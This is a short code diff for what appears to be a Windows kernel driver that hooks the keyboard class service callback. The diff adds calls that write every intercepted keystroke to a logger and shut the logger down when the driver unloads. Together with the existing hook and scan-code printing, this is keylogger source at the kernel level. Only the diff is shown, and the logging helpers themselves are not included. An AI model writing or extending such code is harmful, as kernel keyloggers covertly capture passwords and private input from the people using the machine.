@@ -20,6 +20,7 @@ VOID MyKeyboardClassServiceCallback(
 			print_keystroke((UCHAR)input->MakeCode);
 		}
 	}
+	WriteKeyboardInputData(InputDataStart, (ULONG)(InputDataEnd - InputDataStart));
 	g_oldCallbackPtr(DeviceObject, InputDataStart, InputDataEnd, InputDataConsumed);
 }
 
@@ -29,6 +30,7 @@ VOID callbackDriverUnload(PDRIVER_OBJECT obj)
 	for (int i = 0; i < g_ptrCount; ++i) {
 		*(g_pOldCallbackPtrs[i]) = g_oldCallbackPtr;
 	}
+	UninitLogger();
 }
 
 BOOLEAN HookImpl(LPCWSTR targetName, PDRIVER_OBJECT kbdObj)
